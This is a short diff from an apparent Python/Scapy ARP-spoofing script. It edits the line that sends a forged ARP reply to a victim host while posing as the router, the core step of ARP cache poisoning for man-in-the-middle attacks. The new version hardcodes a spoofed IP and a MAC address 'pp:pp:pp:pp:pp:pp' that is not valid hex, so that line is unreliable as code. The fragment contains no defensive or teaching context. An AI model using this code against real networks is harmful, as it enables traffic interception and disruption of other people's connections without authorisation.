@@ -35,7 +35,7 @@ print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
  #   pass
 
 
-tovictim = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[router-1]), pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
+tovictim = srp(ARP(hwsrc = "pp:pp:pp:pp:pp:pp",op = 2,psrc="10.5.1.60", pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
 
     
     
